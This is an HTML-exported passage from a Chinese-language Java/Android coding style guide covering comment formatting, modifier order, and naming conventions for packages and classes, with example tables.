lang="zh-CN">&#27880;&#37322;&#65292;&#21518;&#32493;&#34892;&#24517;&#39035;&#20174;<em>&#24320;&#22987;&#65292;&#24182;&#19988;&#19982;&#21069;&#19968;&#34892;&#30340;</em>&#23545;&#40784;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20197;&#19979;&#31034;&#20363;&#27880;&#37322;&#37117;&#26159;</span></font></font><font size="3" style="font-size: 12pt">OK</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#12290;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">/**This is // And so /* Or you can_x000D_ *  okay. // is this. * even dothis. */<font face="Courier New, serif"><font size="2" style="font-size: 10pt">_x000D_*/</font></font></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#37322;&#19981;&#35201;&#23553;&#38381;&#22312;&#30001;&#26143;&#21495;&#25110;&#20854;&#23427;&#23383;&#31526;&#32472;&#21046;&#30340;&#26694;&#26550;&#37324;&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65306;&#22312;&#20889;&#22810;&#34892;&#27880;&#37322;&#26102;&#65292;&#22914;&#26524;&#20320;&#24076;&#26395;&#22312;&#24517;&#35201;&#26102;&#33021;&#37325;&#26032;&#25442;&#34892;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">(</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21363;&#27880;&#37322;&#20687;&#27573;&#33853;&#39118;&#26684;&#19968;&#26679;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">)</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#37027;&#20040;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">/</font><em><font face="&#23435;&#20307;, serif">... </font></em><font face="&#23435;&#20307;, serif">/</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc217051783"></a>4.8.7 Modifiers</h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#21644;&#25104;&#21592;&#30340;</span></font></font><font size="3" style="font-size: 12pt">modifiers</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#23384;&#22312;&#65292;&#21017;&#25353;</span></font></font><font size="3" style="font-size: 12pt">Java</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#35328;&#35268;&#33539;&#20013;&#25512;&#33616;&#30340;&#39034;&#24207;&#20986;&#29616;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br>publicprotected private abstract static final transient volatilesynchronized native strictfp</font></p><h1 class="western" style="widows: 2; orphans: 2"><a name="_Toc2127551420"></a>5. <font face="&#23435;&#20307;"><span lang="zh-CN">&#21629;&#21517;&#32422;&#23450;</span></font></h1><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1056020689"></a>5.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#23545;&#25152;&#26377;&#26631;&#35782;&#31526;&#37117;&#36890;&#29992;&#30340;&#35268;&#21017;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26631;&#35782;&#31526;&#21482;&#33021;&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">ASCII</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#27597;&#21644;&#25968;&#23383;&#65292;&#22240;&#27492;&#27599;&#20010;&#26377;&#25928;&#30340;&#26631;&#35782;&#31526;&#21517;&#31216;&#37117;&#33021;&#21305;&#37197;&#27491;&#21017;&#34920;&#36798;&#24335;</span></font></font><font size="3" style="font-size: 12pt">\w+</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc302299795"></a>5.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26631;&#35782;&#31526;&#31867;&#22411;&#30340;&#35268;&#21017;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc332794742"></a>5.2.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21253;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21253;&#21517;&#20840;&#37096;&#23567;&#20889;&#65292;&#36830;&#32493;&#30340;&#21333;&#35789;&#21482;&#26159;&#31616;&#21333;&#22320;&#36830;&#25509;&#36215;&#26469;&#65292;&#19981;&#20351;&#29992;&#19979;&#21010;&#32447;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#37319;&#29992;&#21453;&#22495;&#21517;&#21629;&#21517;&#35268;&#21017;&#65292;&#20840;&#37096;&#20351;&#29992;&#23567;&#20889;&#23383;&#27597;&#12290;&#19968;&#32423;&#21253;&#21517;&#20026;</span></font></font><font size="3" style="font-size: 12pt">com</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#20108;&#32423;&#21253;&#21517;&#20026;</span></font></font><font size="3" style="font-size: 12pt">xx</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65288;&#21487;&#20197;&#26159;&#20844;&#21496;&#25110;&#21017;&#20010;&#20154;&#30340;&#38543;&#20415;&#65289;&#65292;&#19977;&#32423;&#21253;&#21517;&#26681;&#25454;&#24212;&#29992;&#36827;&#34892;&#21629;&#21517;&#65292;&#22235;&#32423;&#21253;&#21517;&#20026;&#27169;&#22359;&#21517;&#25110;&#23618;&#32423;&#21517;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt">com.zyj.beauty</font></p><table width="560" cellpadding="1" cellspacing="0"><col width="290"><col width="266"><thead><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#21253;&#21517;</b></font></span></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#27492;&#21253;&#20013;&#21253;&#21547;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.activity</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#39029;&#38754;&#29992;&#21040;&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Activity</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">(activitie</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#23618;&#32423;&#21517;&#29992;&#25143;&#30028;&#38754;&#23618;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">)</font></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.base</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#22522;&#30784;&#20849;&#20139;&#30340;&#31867;</font></span></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.adapter</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#39029;&#38754;&#29992;&#21040;&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Adapter</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">(</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#36866;&#37197;&#22120;&#30340;&#31867;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">)</font></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.util</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#27492;&#21253;&#20013;&#21253;&#21547;&#65306;&#20844;&#20849;&#24037;&#20855;&#26041;&#27861;&#31867;&#65288;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">util</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#27169;&#22359;&#21517;&#65289;</font></span></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.bean</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#19979;&#38754;&#21487;&#20998;&#65306;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">vo</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#12289;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">po</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#12289;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">dto</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#27492;&#21253;&#20013;&#21253;&#21547;&#65306;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">JavaBean</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;</font></span></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.model</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#27492;&#21253;&#20013;&#21253;&#21547;&#65306;&#27169;&#22411;&#31867;</font></span></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.db</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25968;&#25454;&#24211;&#25805;&#20316;&#31867;</font></span></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.view(</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;&#32773;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.widget)</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#33258;&#23450;&#20041;&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">View</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;&#31561;</font></span></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.service</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Service</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#26381;&#21153;</font></span></font></p></td></tr><tr><td width="290" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">com.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20844;&#21496;&#21517;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24212;&#29992;&#21517;&#31216;&#32553;&#20889;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">.receiver</font></font></p></td><td width="266" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">BroadcastReceiver</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#26381;&#21153;</font></span></font></p></td></tr></tbody></table><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#24847;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif"><br></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#39033;&#30446;&#37319;&#29992;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">MVP</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#25152;&#26377;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">M</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12289;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">V</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12289;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">P</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25277;&#21462;&#20986;&#26469;&#30340;&#25509;&#21475;&#37117;&#25918;&#32622;&#22312;&#30456;&#24212;&#27169;&#22359;&#30340;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">i</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21253;&#19979;&#65292;&#25152;&#26377;&#30340;&#23454;&#29616;&#37117;&#25918;&#32622;&#22312;&#30456;&#24212;&#27169;&#22359;&#30340;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">impl</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19979;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc636527165"></a>5.2.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#21517;&#37117;&#20197;</span></font></font><font size="3" style="font-size: 12pt">UpperCamelCase</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#32534;&#20889;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#21517;&#36890;&#24120;&#26159;&#21517;&#35789;&#25110;&#21517;&#35789;&#30701;&#35821;&#65292;&#25509;&#21475;&#21517;&#31216;&#26377;&#26102;&#21487;&#33021;&#26159;&#24418;&#23481;&#35789;&#25110;&#24418;&#23481;&#35789;&#30701;&#35821;&#12290;&#29616;&#22312;&#36824;&#27809;&#26377;&#29305;&#23450;&#30340;&#35268;&#21017;&#25110;&#34892;&#20043;&#26377;&#25928;&#30340;&#32422;&#23450;&#26469;&#21629;&#21517;&#27880;&#35299;&#31867;&#22411;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21517;&#35789;&#65292;&#37319;&#29992;&#22823;&#39548;&#23792;&#21629;&#21517;&#27861;&#65292;&#23613;&#37327;&#36991;&#20813;&#32553;&#20889;&#65292;&#38500;&#38750;&#35813;&#32553;&#20889;&#26159;&#20247;&#25152;&#21608;&#30693;&#30340;&#65292;&#27604;&#22914;</span></font></font><font size="3" style="font-size: 12pt">HTML,URL</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#22914;&#26524;&#31867;&#21517;&#31216;&#20013;&#21253;&#21547;&#21333;&#35789;&#32553;&#20889;&#65292;&#21017;&#21333;&#35789;&#32553;&#20889;&#30340;&#27599;&#20010;&#23383;&#27597;&#22343;&#24212;&#22823;&#20889;&#12290;</span></font></font></p><table width="560" cellpadding="1" cellspacing="0"><col width="120"><col width="225"><col width="208"><thead><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#31867;</b></font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#25551;&#36848;</b></font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#20363;&#22914;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Activity</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Activity</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21518;&#32512;&#26631;&#35782;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#27426;&#36814;&#39029;&#38754;&#31867;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">WelcomeActivity</font></font></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Adapter</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Adapter</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21518;&#32512;&#26631;&#35782;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#26032;&#38395;&#35814;&#24773;&#36866;&#37197;&#22120;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">NewDetailAdapter</font></font></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#35299;&#26512;&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Parser</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21518;&#32512;&#26631;&#35782;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#39318;&#39029;&#35299;&#26512;&#31867;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">HomePosterParser</font></font></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24037;&#20855;&#26041;&#27861;&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Util</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Manager</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21518;&#32512;&#26631;&#35782;&#65288;&#19982;&#31995;&#32479;&#25110;&#31532;&#19977;&#26041;&#30340;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Utils</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21306;&#20998;&#65289;&#25110;&#21151;&#33021;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">+Util</font></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="margin-bottom: 0in; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#32447;&#31243;&#27744;&#31649;&#29702;&#31867;&#65306;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ThreadPoolManager</font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26085;&#24535;&#24037;&#20855;&#31867;&#65306;</span></font></font><font size="3" style="font-size: 12pt">LogUtil</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65288;</span></font></font><font size="3" style="font-size: 12pt">Logger</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20063;&#21487;&#65289;</span></font></font></p><p align="left" style="margin-top: 0.19in; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span 